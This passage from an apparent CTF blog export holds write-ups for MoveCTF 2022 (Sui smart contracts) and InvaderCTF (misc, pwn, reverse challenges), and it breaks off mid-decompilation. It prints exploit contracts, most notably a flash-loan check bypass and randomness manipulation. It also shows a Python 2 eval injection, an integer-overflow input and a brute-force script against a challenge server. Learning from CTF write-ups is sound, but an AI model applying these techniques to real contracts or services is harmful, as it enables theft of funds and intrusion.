[{"categories":["Move","SUI","Security","CTF","Smart Contract","Web3"],"content":" Sup?!\nHey, there! long time no see ah? I forgot to tell you that now I\u0026rsquo;m currently learning blokchain and its security. Recently, I tried to compete in MoveCTF which was organized by MoveBit, Ottersec and ChainFlag, sponsored by Mysten Labs(Sui). From the name we can understand that this ctf is conducted on Move langauge and the platform was Sui blockchain.\nI\u0026rsquo;m actually very new to Move (known for 3 days before CTF). Meanwhile, I\u0026rsquo;m learning Aptos, later shockingly known that this ctf was based on sui blockchain. Literally, I\u0026rsquo;ve been hurried up and learn sui in the period of ctf and try to compete. However, I tried to complete 3 out 4 ctf problems.\nBasic CheckIn - 100 pts Flashloan - 200 pts SimpleGame - 400 pts Basic CheckIn module movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; struct Flag has copy, drop { user: address, flag: bool } public entry fun get_flag(ctx: \u0026amp;mut TxContext) { event::emit(Flag { user: tx_context::sender(ctx), flag: true }) } } If we call the get_flag funtion, then the flag becomes true.\n$ sui client --call --function get_flag --module checkin --package \u0026lt;ProgramDeployedAddress\u0026gt; --gas-budget 1000 Level completed.\nFlash Loan module movectf::flash{ use sui::transfer; use sui::tx_context::{Self, TxContext}; use sui::object::{Self, ID, UID}; use sui::balance::{Self, Balance}; use sui:: coin::{Self, Coin}; use sui::vec_map::{Self, VecMap}; use sui::event; struct FLASH has drop {} struct FlashLender has key { id: UID, to_lend: Balance\u0026lt;FLASH\u0026gt;, last: u64, lender: VecMap\u0026lt;address, u64\u0026gt; } struct Receipt { flash_lender_id: ID, amount: u64 } struct AdminCap has key, store { id: UID, flash_lender_id: ID, } struct Flag has copy, drop { user: address, flag: bool } // creat a FlashLender public fun create_lend(lend_coin: Coin\u0026lt;FLASH\u0026gt;, ctx: \u0026amp;mut TxContext) { let to_lend = coin::into_balance(lend_coin); let id = object::new(ctx); let lender = vec_map::empty\u0026lt;address, u64\u0026gt;(); let balance = balance::value(\u0026amp;to_lend); vec_map::insert(\u0026amp;mut lender ,tx_context::sender(ctx), balance); let flash_lender = FlashLender { id, to_lend, last: balance, lender}; transfer::share_object(flash_lender); } // get the loan public fun loan( self: \u0026amp;mut FlashLender, amount: u64, ctx: \u0026amp;mut TxContext ): (Coin\u0026lt;FLASH\u0026gt;, Receipt) { let to_lend = \u0026amp;mut self.to_lend; assert!(balance::value(to_lend) \u0026gt;= amount, 0); let loan = coin::take(to_lend, amount, ctx); let receipt = Receipt { flash_lender_id: object::id(self), amount }; (loan, receipt) } // repay coion to FlashLender public fun repay(self: \u0026amp;mut FlashLender, payment: Coin\u0026lt;FLASH\u0026gt;) { coin::put(\u0026amp;mut self.to_lend, payment) } // check the amount in FlashLender is correct public fun check(self: \u0026amp;mut FlashLender, receipt: Receipt) { let Receipt { flash_lender_id, amount: _ } = receipt; assert!(object::id(self) == flash_lender_id, 0); assert!(balance::value(\u0026amp;self.to_lend) \u0026gt;= self.last, 0); } // init Flash fun init(witness: FLASH, ctx: \u0026amp;mut TxContext) { let cap = coin::create_currency(witness, 2, ctx); let owner = tx_context::sender(ctx); let flash_coin = coin::mint(\u0026amp;mut cap, 1000, ctx); create_lend(flash_coin, ctx); transfer::transfer(cap, owner); } // get the balance of FlashLender public fun balance(self: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) :u64 { *vec_map::get(\u0026amp;self.lender, \u0026amp;tx_context::sender(ctx)) } // deposit token to FlashLender public entry fun deposit( self: \u0026amp;mut FlashLender, coin: Coin\u0026lt;FLASH\u0026gt;, ctx: \u0026amp;mut TxContext ) { let sender = tx_context::sender(ctx); if (vec_map::contains(\u0026amp;self.lender, \u0026amp;sender)) { let balance = vec_map::get_mut(\u0026amp;mut self.lender, \u0026amp;sender); *balance = *balance + coin::value(\u0026amp;coin); }else { vec_map::insert(\u0026amp;mut self.lender, sender, coin::value(\u0026amp;coin)); }; coin::put(\u0026amp;mut self.to_lend, coin); } // withdraw you token from FlashLender public entry fun withdraw( self: \u0026amp;mut FlashLender, amount: u64, ctx: \u0026amp;mut TxContext ){ let owner = tx_context::sender(ctx); let balance = vec_map::get_mut(\u0026amp;mut self.lender, \u0026amp;owner); assert!(*balance \u0026gt;= amount, 0); *balance = *balance - amount; let to_lend = \u0026amp;mut self.to_lend; transfer::transfer(coin::take(to_lend, amount, ctx), owner); } // check whether you can get the flag public entry fun get_flag(self: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { if (balance::value(\u0026amp;self.to_lend) == 0) { event::emit(Flag { user: tx_context::sender(ctx), flag: true }); } } } Source Inorder to get the flag, we must need to pass the FlashLender object which has a balance 0 (to_lend == 0). Otherwise, we can\u0026rsquo;t able to get the flag. to_lend is decreasing only when a user takes loan from the object. So, now we need to take loan from the lender, it means we need to call public fun loan(...), but from Sui Cli we only able to call pub entry fun \u0026lt;name\u0026gt;(...). But from another contract public fun \u0026lt;name\u0026gt;(...) can be called. So, I tried to write a new contract with payload. But, I dont know Sui and Move. I was so obfuscated. However, after many trails and some chat with my new friend and I got to know how to do. So I got it. You can download and see .toml file to know how I\u0026rsquo;m able to call deployed contract\u0026rsquo;s function from my contract. ExploitContract module exploit_package::attack{ use movectf::flash::{ FlashLender, loan, FLASH, Receipt, get_flag,deposit,repay,check }; use sui::tx_context::{ TxContext}; use sui:: coin::{ Coin}; public entry fun getFlag( lender: \u0026amp;mut FlashLender, payment: u64,ctx: \u0026amp;mut TxContext ){ let (_load, receipt): (Coin\u0026lt;FLASH\u0026gt;, Receipt) = loan(lender,payment,ctx); get_flag(lender,ctx); repay(lender,_load); check(lender,receipt); } } That\u0026rsquo;s the definition of a Flash Loan \u0026ndash; it is a loan that exists only for the duration of the transaction, and it must be repaid before the transaction finishes. The Receipt is part of the pattern (we call it a \u0026ldquo;Hot Potato\u0026rdquo;) to enforce that repayment. So we must repay. but the get_flag only check the balance in object. So, If we takeout full balance and then call get_flag and then repay. Bamn. Done. Now we just have to call our payload contract.\n$ sui client --call --function getFlag --module attack --package \u0026lt;ourDeployedAddress\u0026gt; --args \u0026lt;lenderAddress\u0026gt; 1000 --gas-budget 1000 Note: We can\u0026rsquo;t just Drop returned receipt. There is a function there called check which accepts a Receipt, so calling that would fix things for you in one sense.\nLevel completed.\nSimple Game FullCode // Hero Object - hero.move const MAX_LEVEL: u64 = 2; const INITAL_HERO_HP: u64 = 100; const INITIAL_HERO_STRENGTH: u64 = 10; const INITIAL_HERO_DEFENSE: u64 = 5; const HERO_STAMINA: u64 = 200; public(friend) fun create_hero(ctx: \u0026amp;mut TxContext): Hero { Hero { id: object::new(ctx), level: 1, stamina: HERO_STAMINA, hp: INITAL_HERO_HP, experience: 0, strength: INITIAL_HERO_STRENGTH, defense: INITIAL_HERO_DEFENSE, sword: option::none(), armor: option::none(), } } /// Strength of the hero when attacking public fun strength(hero: \u0026amp;Hero): u64 { // a hero with zero HP is too tired to fight if (hero.hp == 0) { return 0 }; let sword_strength = if (option::is_some(\u0026amp;hero.sword)) { inventory::strength(option::borrow(\u0026amp;hero.sword)) } else { // hero can fight without a sword, but will not be very strong 0 }; hero.strength + sword_strength } /// Defense of the hero when attacking public fun defense(hero: \u0026amp;Hero): u64 { // a hero with zero HP is too tired to fight if (hero.hp == 0) { return 0 }; let armor_defense = if (option::is_some(\u0026amp;hero.armor)) { inventory::defense(option::borrow(\u0026amp;hero.armor)) } else { // hero can fight without a sword, but will not be very strong 0 }; hero.defense + armor_defense } public fun hp(hero: \u0026amp;Hero): u64 { hero.hp } // Sword, Armor and TreasureBox objects - Inventroy.move const MAX_RARITY: u64 = 5; const BASE_SWORD_STRENGTH: u64 = 2; const BASE_ARMOR_DEFENSE: u64 = 1; /// The hero\u0026#39;s trusty sword struct Sword has store { rarity: u64, strength: u64, } /// Armor struct Armor has store { rarity: u64, defense: u64, } ///TreasuryBox struct TreasuryBox has key, store { id: UID, } // SPDX-License-Identifier: Apache-2.0 /// Example of a game character with basic attributes, inventory, and /// associated logic. module game::adventure { /// A creature that the hero can slay to level up struct Monster\u0026lt;phantom T\u0026gt; has key { id: UID, hp: u64, strength: u64, defense: u64, } struct Boar {} struct BoarKing {} /// Boar attributes values const BOAR_MIN_HP: u64 = 80; const BOAR_MAX_HP: u64 = 120; const BOAR_MIN_STRENGTH: u64 = 5; const BOAR_MAX_STRENGTH: u64 = 15; const BOAR_MIN_DEFENSE: u64 = 4; const BOAR_MAX_DEFENSE: u64 = 6; /// BoarKing attributes values const BOARKING_MIN_HP: u64 = 180; const BOARKING_MAX_HP: u64 = 220; const BOARKING_MIN_STRENGTH: u64 = 20; const BOARKING_MAX_STRENGTH: u64 = 25; const BOARKING_MIN_DEFENSE: u64 = 10; const BOARKING_MAX_DEFENSE: u64 = 15; fun create_monster\u0026lt;T\u0026gt;( min_hp: u64, max_hp: u64, min_strength: u64, max_strength: u64, min_defense: u64, max_defense: u64, ctx: \u0026amp;mut TxContext ): Monster\u0026lt;T\u0026gt; { let id = object::new(ctx); let hp = random::rand_u64_range(min_hp, max_hp, ctx); let strength = random::rand_u64_range(min_strength, max_strength, ctx); let defense = random::rand_u64_range(min_defense, max_defense, ctx); Monster\u0026lt;T\u0026gt; { id, hp, strength, defense, } } /// return: 0: tie, 1: hero win, 2: monster win; fun fight_monster\u0026lt;T\u0026gt;(hero: \u0026amp;Hero, monster: \u0026amp;Monster\u0026lt;T\u0026gt;): u64 { let hero_strength = hero::strength(hero); let hero_defense = hero::defense(hero); let hero_hp = hero::hp(hero); let monster_hp = monster.hp; // attack the monster until its HP goes to zero let cnt = 0u64; // max fight times let rst = 0u64; // 0: tie, 1: hero win, 2: monster win; while (monster_hp \u0026gt; 0) { // first, the hero attacks let damage = if (hero_strength \u0026gt; monster.defense) { hero_strength - monster.defense } else { 0 }; if (damage \u0026lt; monster_hp) { monster_hp = monster_hp - damage; // then, the boar gets a turn to attack. if the boar would kill // the hero, abort--we can\u0026#39;t let the boar win! let damage = if (monster.strength \u0026gt; hero_defense) { monster.strength - hero_defense } else { 0 }; if (damage \u0026gt;= hero_hp) { rst = 2; break } else { hero_hp = hero_hp - damage; } } else { rst = 1; break }; cnt = cnt + 1; if (cnt \u0026gt; 20) { break } }; rst } public entry fun slay_boar(hero: \u0026amp;mut Hero, ctx: \u0026amp;mut TxContext) { assert!(hero::stamina(hero) \u0026gt; 0, EHERO_TIRED); let boar = create_monster\u0026lt;Boar\u0026gt;( BOAR_MIN_HP, BOAR_MAX_HP, BOAR_MIN_STRENGTH, BOAR_MAX_STRENGTH, BOAR_MIN_DEFENSE, BOAR_MAX_DEFENSE, ctx ); let fight_result = fight_monster\u0026lt;Boar\u0026gt;(hero, \u0026amp;boar); hero::decrease_stamina(hero, 1); // hero takes their licks if (fight_result == 1) { hero::increase_experience(hero, 1); let d100 = random::rand_u64_range(0, 100, ctx); if (d100 \u0026lt; 10) { let sword = inventory::create_sword(ctx); hero::equip_or_levelup_sword(hero, sword, ctx); } else if (d100 \u0026lt; 20) { let armor = inventory::create_armor(ctx); hero::equip_or_levelup_armor(hero, armor, ctx); }; }; // let the world know about the hero\u0026#39;s triumph by emitting an event! event::emit(SlainEvent\u0026lt;Boar\u0026gt; { slayer_address: tx_context::sender(ctx), hero: hero::id(hero), boar: object::uid_to_inner(\u0026amp;boar.id), }); let Monster\u0026lt;Boar\u0026gt; { id, hp: _, strength: _, defense: _} = boar; object::delete(id); } public entry fun slay_boar_king(hero: \u0026amp;mut Hero, ctx: \u0026amp;mut TxContext) { assert!(hero::stamina(hero) \u0026gt; 0, EHERO_TIRED); let boar = create_monster\u0026lt;BoarKing\u0026gt;( BOARKING_MIN_HP, BOARKING_MAX_HP, BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH, BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE, ctx ); let fight_result = fight_monster\u0026lt;BoarKing\u0026gt;(hero, \u0026amp;boar); hero::decrease_stamina(hero, 2); // hero takes their licks if (fight_result == 1) { // hero won hero::increase_experience(hero, 2); let d100 = random::rand_u64_range(0, 100, ctx); if (d100 == 0) { let box = inventory::create_treasury_box(ctx); transfer::transfer(box, tx_context::sender(ctx)); }; }; // let the world know about the hero\u0026#39;s triumph by emitting an event! event::emit(SlainEvent\u0026lt;BoarKing\u0026gt; { slayer_address: tx_context::sender(ctx), hero: hero::id(hero), boar: object::uid_to_inner(\u0026amp;boar.id), }); let Monster\u0026lt;BoarKing\u0026gt; { id, hp: _, strength: _, defense: _} = boar; object::delete(id); } //Exploit module exploit_package::attack{ use game::hero::{ Hero, level_up, }; use game::adventure::{ slay_boar,slay_boar_king }; use game::inventory::{ TreasuryBox, get_flag }; use ctf::random::{ rand_u64_range }; use sui::tx_context::{TxContext}; public entry fun getFlag(box: TreasuryBox, ctx: \u0026amp;mut TxContext){ let ctx_ = morphContext(ctx); if (rand_u64_range(0,100,ctx_) == 0){ get_flag(box,ctx_); }else{ // TODO: Morph ctx get_flag(box,ctx_); } } public entry fun winTreasureBox(hero: \u0026amp;mut Hero,ctx: \u0026amp;mut TxContext){ let ctx_ = morphContext(ctx); if (rand_u64_range(0,100,ctx_)==0){ let i = 0; while (i\u0026lt;=105){ slay_boar(hero,ctx_); i = i+1; }; level_up(hero); slay_boar_king(hero,ctx_); } } } Explanation:\nEntry fun 1.\nFirst we have to win the slay_boar to get sword (sworg give strength to hero) It can be possible when randomFuntion(ctx) == 0 So, Now if can able to morphed the ctx on our contract side which results to give 0 when random funtions calls we can use move forward. If we use the same ctx for next 100 times, every time slay_boar will loose and hero strength will increase. So we can level up the hero with the same ctx our Hero HP, Strength, Defence becomes x2 and Stamina will become 90+ [becomes Strength = 20, Defence = 10, HP = 200 ] so slay_boar_king\u0026rsquo;s MIN Strength will be less than our strength, Defence will be same as our Hero\u0026rsquo;s, If we\u0026rsquo;re in the same ctx, ofc it return 0 and we will win slay_boar_king, then Treasure created and transfered to called pub key. return Note: Gas must be so high, because of computation.\nEntry fun 2.\nThis function takes two args - Treasurebox ID and ctx Like previous methodology, morph the ctx, so if we able to return 0 from ctx. call get_flag with parameters. $ sui client --call --function winTreasureBox --module attack --package \u0026lt;ourDeployedAddress\u0026gt; --args \u0026lt;HeroAddress\u0026gt; --gas-budget 10000 ; # TRANSACTION OUTPUT ; # Mutated Objects ; # ... $ sui client --call --function getFlag --module attack --package \u0026lt;ourDeployedAddress\u0026gt; --args\u0026lt;TresaureBoxAddress\u0026gt; --gas-budget 1000 Done.\nI enjoyed a lot of cool stuff this weekend, amn\u0026rsquo;t I?\n","date":"Nov 8, 2022","img":"https://0x4ka5h.github.io/posts/movectf-2022/files/logo2.png","permalink":"https://0x4ka5h.github.io/posts/movectf-2022/","series":[],"tags":[""],"title":"MoveCTF 2022"},{"categories":["CTF","WriteUps","Security"],"content":"Sup?!\nHey, there! After a bit gap, I’m back with CSAW CTF in Qualifers round problems, I played this CTF along with Invaders team and ended up at #5 in India region. I solved 2 Misc challenges – catTheFlag, ezMaze.\ncatTheFlag Well,one moment please. We can catch up after CSAW'22 finals. ","date":"Aug 17, 2022","img":"https://0x4ka5h.github.io/posts/csaw_quals_2022/files/csaw.jpg","permalink":"https://0x4ka5h.github.io/posts/csaw_quals_2022/","series":[],"tags":["Misc"],"title":"CSAW Quals 2022"},{"categories":["CTF","WriteUps","Security"],"content":"Introduction Hello mate, Sup?\nLong time, no see ah? Don\u0026rsquo;t worry, I\u0026rsquo;m coming. Here we go, Our new blog but this time with a different topic 🙃. Me, entering the world of CTFs and Application security. Playing “InvaderCTF” is my first step toward the path that I have chosen. And, at the end of the day, it’s a 🥳BANG! I\u0026rsquo;m able to secure my position in the Top 3.\nActually, I\u0026rsquo;m studying at RGUKT. Some of the alumni of our college called Team Invaders conducted this CTF.\nThere is a list of categories in this CTF such as “web”, “pwn”, “reverse”, “cryptography”, and “miscellaneous”. During CTF I was mostly dedicated to Web and Reverse categories. This CTF was conducted with a very basic level of challenges to encourage the students..\nRandon Reader(RR): \u0026ldquo;Quick!\u0026rdquo;\nOkay okay, let me explain the approch that I have followed to solve those challenges.\nMISC Sniff Challenge - misc2.pcapng , here is the file (sniffed packet).\nOpen .pcap file with wireshark, filter with http. Found some captured traffic data, filter with \u0026ldquo;flag\u0026rdquo;. We\u0026rsquo;ll found a packet with /flag_in_authorization_header Extract Authorization header value and decrypt with base64, got it! done. #Extracted header value token = \u0026#34;SW52YWRlckNURntOaWNlX3BjYXBfYW5hbHlzaW5nX3NraWxsc30=\u0026#34; import base64 flag = base64.b64decode(token) print(flag) # b\u0026#39;InvaderCTF{Nice_pcap_analysing_skills}\u0026#39; Python2 ## This is the code that was given in chall.py #!/usr/bin/python2 import flag import sys sys.stdout.write(\u0026#39;\u0026#39;\u0026#39;\\t +++++ Even/Odd Calculator +++++ Enter a number: \u0026#39;\u0026#39;\u0026#39;) sys.stdout.flush() inp = input() sys.stdout.write(\u0026#39;The number you entered is \u0026#39; + str(inp)) if inp % 2 == 0: sys.stdout.write(\u0026#39; and it is even!\u0026#39;) else: sys.stdout.write(\u0026#39; and it is odd!\u0026#39;) sys.stdout.write(\u0026#39;\\n\u0026#39;) sys.stdout.flush() exit() Let me explain you about python2.* input. In python2 there two ways to take an input from the user using input funtion.\ninput() -\u0026gt; This function takes the value and type of the input you enter as it is without modifying any type. raw_input() -\u0026gt; This function explicitly converts the input you give to type string. Guess, what we can do. We can call funtions directly. Noice.\n$ python2 chall.py +++++ Even/Odd Calculator +++++ Enter a number: 1==1 The number you entered is True and it is even! $ # wow it print resultant value, puck we catch it :P $ # If you see in the code, the flag is being imported and the flag also in string format $ # so we can see doc-strings and built-in function of flag module, lets try it $ python2 chall.py +++++ Even/Odd Calculator +++++ Enter a number: dir(flag) The number you entered is [\u0026#39;__builtins__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__file__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__package__\u0026#39;,\u0026#39;here_is_your_flag\u0026#39;] and it is odd! $ # Yay, our flag is stored in here_is_your_flag, so can call it with flag.here_is_your_flag $ python2 chall.py +++++ Even/Odd Calculator +++++ Enter a number: flag.here_is_your_flag The number you entered is InvaderCTF{python2_is_vulnerable_huh!} and it is odd! Mnemonics ## This is the code that was given in chall.py #!/usr/bin/python3 list_of_words = [\u0026#39;abc\u0026#39;, \u0026#39;def\u0026#39;, \u0026#39;ghi\u0026#39;] flag = \u0026#39;Dummy_FLAG\u0026#39; # Real flag is on the server print(\u0026#39;\u0026#39;\u0026#39;Let\u0026#39;s play a game :) Guess the words that comes to my mind. And if you guess it correctly everytime, you will get the flag as reward!\u0026#39;\u0026#39;\u0026#39;) WORD_COUNT = len(list_of_words) index = 0 while (input(\u0026#39;Enter the word (%s/%s): \u0026#39;%(index + 1, WORD_COUNT)) == list_of_words[index]): index += 1 if index == WORD_COUNT: exit(\u0026#39;Here is your flag: \u0026#39; + flag) exit(\u0026#39;Nah, you got it wrong! The word is \u0026#39; + list_of_words[index]) Boom, we got that.\nRandom Reader (RR) : What boom?\nMe: See that last line, if we guess the wrong word, correct word is printing.\nRR : Boom!\nHaha!, Lets write a program cause there are 500 words to guess.\nfrom pwn import * # for netcat connection h = \u0026#34;198.199.123.169\u0026#34; port = \u0026#34;9390\u0026#34; conn = remote(h,port) recvd = conn.recv() conn.sendline(b\u0026#39;puck\u0026#39;) crct_ans = conn.recv() print(crct_ans.split()[-1]) ## prints correct word. Now, if we are able to store the correct value in a list and then we can send it again to the program cause if we made a false guess, then the program will end.\nfrom pwn import * # for netcat connection h = \u0026#34;198.199.123.169\u0026#34; port = \u0026#34;9390\u0026#34; crct_words = [] for i in range(500): conn = remote(h,port) recvd = conn.recv() for word in crct_words: conn.sendline(word.decode(\u0026#39;utf-8\u0026#39;)) flag = conn.recv() conn.sendline(b\u0026#39;puck\u0026#39;) crct_ans = conn.recv() crct_words.append(crct_ans.split()[-1]) print(flag) ## prints flag -\u0026gt; InvaderCTF{Test_FLAG_123_Mnemonics} PWN Food_Court_OverFlow Challenge court.zip, here you can download the challange zip file.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int wallet = 200; int order(char *item, int cost) { int n; printf(\u0026#34;Input the number of %s you want to buy?\\n\u0026#34;, item); printf(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); if (n \u0026gt; 0) { cost = cost * n; printf(\u0026#34;That will cost Rs%d.\\n\u0026#34;, cost); if (cost \u0026lt;= wallet) { puts(\u0026#34;Order placed!\u0026#34;); wallet -= cost; } else { puts(\u0026#34;Ah man, you don\u0026#39;t have enough money to buy this order\u0026#34;); n = 0; } } else { puts(\u0026#34;Nah, buy something.\u0026#34;); } return n; } void initialize() { alarm(60); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); } int main() { int item; puts(\u0026#34;Welcome to RGUKT Food Court!\u0026#34;); puts(\u0026#34;We are giving free 200 RS wallet amount to our online customers.\u0026#34;); puts(\u0026#34;Sadly, you don\u0026#39;t have enough money to buy the tastiest dish named Flag :/? Or is it? \\n\u0026#34;); while (1) { printf(\u0026#34;Wallet Amount Rs%d.\\n\u0026#34;, wallet); puts(\u0026#34;Menu: \u0026#34;); puts(\u0026#34;1. Noodles: 50\u0026#34;); puts(\u0026#34;2. Biryani: 100\u0026#34;); puts(\u0026#34;3. Soft Drink: 20\u0026#34;); puts(\u0026#34;4. Flag: Rs 1000\u0026#34;); puts(\u0026#34;0. Logout\\n\u0026#34;); puts(\u0026#34;Which item would you like to Order?\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;item); switch (item) { case 0: printf(\u0026#34;Logging out\u0026#34;); return 0; case 1: order(\u0026#34;Nooooodles\u0026#34;, 50); break; case 2: order(\u0026#34;Dum Biryani\u0026#34;, 100); break; case 3: order(\u0026#34;Soft Drink\u0026#34;, 1); break; case 4: if (order(\u0026#34;buy the today\u0026#39;s special dish - flag\u0026#34;, 1000) \u0026gt; 0) { FILE *fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); char flag[100]; if (fp == NULL) { puts(\u0026#34;Create flag.txt in the current working directory\u0026#34;); puts(\u0026#34;Please report to admin if you saw this error on remote\u0026#34;); exit(1); } fgets(flag, sizeof(flag), fp); puts(flag); } break; default: puts(\u0026#34;Please select a valid item.\u0026#34;); } } } The challenge name itself a big hint! lol🫂, the interger is declared as int. we just need to give a number that belongs to out of the signed int range.\nsinged int range for\n2 or 4 bytes\t(-32,768 to 32,767 or -2,147,483,648 to 2,147,483,647) Lets understand the program, once input is taken, the program multiplied it with 1000, and stores in int.\nThe overflow happens iff we give a number and when 1000 is multipled with it, the resultant must be greater than 2,147,483,647.\nSo we if input 21474836, then 21474836*1000 \u0026raquo; 2,147,483,647. BAMM, done.\n$ gcc court.c $ ./a.out Welcome to RGUKT Food Court! We are giving free 200 RS wallet amount to our online customers. Sadly, you dont have enough money to buy the tastiest dish named Flag :/? Or is it? Wallet Amount Rs200. Menu: 1. Noodles: 50 2. Biryani: 100 3. Soft Drink: 20 4. Flag: Rs 1000 0. Logout Which item would you like to Order? \u0026gt; 4 Input the number of buy the todays special dish - flag you want to buy? \u0026gt; 21474836 That will cost Rs-480. Order placed! InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server} Wallet Amount Rs680. Menu: 1. Noodles: 50 2. Biryani: 100 3. Soft Drink: 20 4. Flag: Rs 1000 0. Logout Which item would you like to Order? \u0026gt; # BAMM, InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server} here is our flag REV pyencryptor #this is the code in chall.py import random # Two byte hash def myHash(string): random.seed(\u0026#34;H4shS33d\u0026#34; + string) num = random.getrandbits(16) return hex(num)[2:].zfill(4) def encryptFlag(flag): enc = \u0026#34;\u0026#34; for char in flag: enc += myHash(char) return enc flag = input(\u0026#34;Enter flag : \u0026#34;) enc = encryptFlag(flag) print(\u0026#34;Encrypted flag is : \u0026#34;, enc) ## Encrpted flag # 08ef07973844262cd256a8635295ad53ece7518ae30f1fb9bdbfbfa9529526 # 2c1fb917ac757352956685500ebfa9cf347573d2566685bdbfbfa9cf34bdbff # 2a30797b15a66856217cf34668507287573262c908276b5 Now, we need to write a reverse code to decrypt the flag. We already know, our flag contains InvaderCTF{ at beginning.\nimport random random.seed(\u0026#34;H4shS33d\u0026#34;+\u0026#34;I\u0026#34;) num = random.getrandbits(16) print(number) # 2287, is always generate same h = hex(2287)[2:].zfill[4] print(h) # 08ef -\u0026gt; front [0:4] slice part of decrypted flag # if we print 0x08ef -\u0026gt; 2287 BOOM, BAAMM, it done bro 🥲.\nIf we iterate a loop over all printable values, we can get our flag back\nimport random import string flag = \u0026#34;08ef07973844262cd256a8635295ad53ece7518ae30f1fb9bdbfbfa95295262c\u0026#34; + \\ \u0026#34;1fb917ac757352956685500ebfa9cf347573d2566685bdbfbfa9cf\u0026#34; + \\ \u0026#34;34bdbff2a30797b15a66856217cf34668507287573262c908276b5\u0026#34; flag = [flag[i:i+4] for i in range(0,len(flag),4)] for j in flag: for i in string.printable: random.seed(\u0026#34;H4shS33d\u0026#34;+i) num = random.getrandbits(16) if int(j,16)==num: print(i,end=\u0026#34;\u0026#34;) break # InvaderCTF{ch4ract3r_b4s3d_h4sh1ng_is_w3ak} Crack_ME challegen - crack_me.pyc is given in the zip file.\nI have used online decompiler to reverse .pyc file import random random.seed(u\u0026#39;[5\\x80E\\x1d\\x1aX\\x91Z\\x8f\u0026#39;) def encrypt(string): enc = [] for char in string: temp = ord(char) + 120 ^ random.getrandbits(7) enc.append(temp) return bytearray(enc) flag = input(\u0026#39;Enter flag : \u0026#39;) encFlag = encrypt(flag) if encFlag == \u0026#39;\\xd1\\xe0\\xb3\\x9e\\x80\\xbf\\xd3\\x97\\xa1\\xda\\x97\\xdd\\xe4\\xef\\xc9\\xdf\\x92\\xff\\xa2\\xd5\\x95\\xfc\\x99\\xe6\\xbc\\xfa\\xf5\\xab\\xd1\\x89\\xae\\xd4\\xe0\\x94\\xbb\\x80\\x96\\x97\\xa4\\xd5\\xd1\\xe6\\xce\u0026#39;: print(\u0026#39;Flag was right :)\u0026#39;) else: print(\u0026#39;Nope\u0026#39;) This is the code we got it from decompiler, if our input matches to\n\u0026#39;\\xd1\\xe0\\xb3\\x9e\\x80\\xbf\\xd3\\x97\\xa1\\xda\\x97\\xdd\\xe4\\xef\\xc9\\xdf\\x92\\xff\\xa2\\xd5\\x95\\xfc\\x99\\xe6\\xbc\\xfa\\xf5\\xab\\xd1\\x89\\xae\\xd4\\xe0\\x94\\xbb\\x80\\x96\\x97\\xa4\\xd5\\xd1\\xe6\\xce\u0026#39; this, then our input is the flag.\nIf you observe that, the seed is common for all bits. It means, how many time we run random.getrandbits(7) after seeding we get the same sequence values.\nNow we just need to find which printable char is satisfied the condition ord(i) + 120 ^ p == encFlag[]\nimport random import string st = b\u0026#39;\\xd1\\xe0\\xb3\\x9e\\x80\\xbf\\xd3\\x97\\xa1\\xda\\x97\\xdd\\xe4\\xef\\xc9\\xdf\\x92\\xff\\xa2\\xd5\\x95\\xfc\\x99\\xe6\\xbc\\xfa\\xf5\\xab\\xd1\\x89\\xae\\xd4\\xe0\\x94\\xbb\\x80\\x96\\x97\\xa4\\xd5\\xd1\\xe6\\xce\u0026#39; random.seed(u\u0026#39;[5\\x80E\\x1d\\x1aX\\x91Z\\x8f\u0026#39;) flag = [] j = 0 while j\u0026lt;43: p = random.getrandbits(7) for i in string.printable: temp = ord(i) + 120 ^ p if temp == st[j]: print(i,end=\u0026#34;\u0026#34;) break j+=1 # InvaderCTF{d3c0mpilati0n_m4kes_l1f3_e4si3r} Binary Challange - Binary , here is the link for zip file.\nOnce you download that file, you will find a gcc executable file, it containes the flag.\nSearching the flag in strings\n$ strings binary .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got .. .. # No flag here So, I tried to recover assemnbly code from binary executable. I used ghidra. And decompiled the executable.\nundefined8 verifyFlag(char *param_1){ int iVar1; size_t sVar2; undefined8 uVar3; long in_FS_OFFSET; uint local_d4; int local_d0; int local_cc; uint local_c8 [46]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); sVar2 = strlen(param_1); if (sVar2 == 0x37) { iVar1 = strncmp(param_1,\u0026#34;InvaderCTF{\u0026#34;,0xb); if (iVar1 == 0) { local_c8[0] = 0x37b; local_c8[1] = 0x352; local_c8[2] = 0x38c; local_c8[3] = 0x39f; local_c8[4] = 0x395; local_c8[5] = 0x3c8; local_c8[6] = 0x3bf; local_c8[7] = 0x3ca; local_c8[8] = 0x39a; local_c8[9] = 0x38f; local_c8[10] = 0x373; local_c8[11] = 0x3bd; local_c8[12] = 0x3b2; local_c8[13] = 0x3c3; local_c8[14] = 0x385; local_c8[15] = 0x3b7; local_c8[16] = 0x3bd; local_c8[17] = 0x37b; local_c8[18] = 0x38a; local_c8[19] = 0x37a; local_c8[20] = 0x3bc; local_c8[21] = 0x3a7; local_c8[22] = 0x3a1; local_c8[23] = 0x373; local_c8[24] = 0x37d; local_c8[25] = 0x3ab; local_c8[26] = 0x3ba; local_c8[27] = 0x3bb; local_c8[28] = 0x3b3; local_c8[29] = 0x3b6; local_c8[30] = 0x3e4; local_c8[31] = 0x3ef; local_c8[32] = 0x3bb; local_c8[33] = 0x3bd; local_c8[34] = 0x3f0; local_c8[35] = 0x3f0; local_c8[36] = 0x3eb; local_c8[37] = 0x3e9; local_c8[38] = 0x3ed; local_c8[39] = 0x3ba; local_c8[40] = 0x3f7; local_c8[41] = 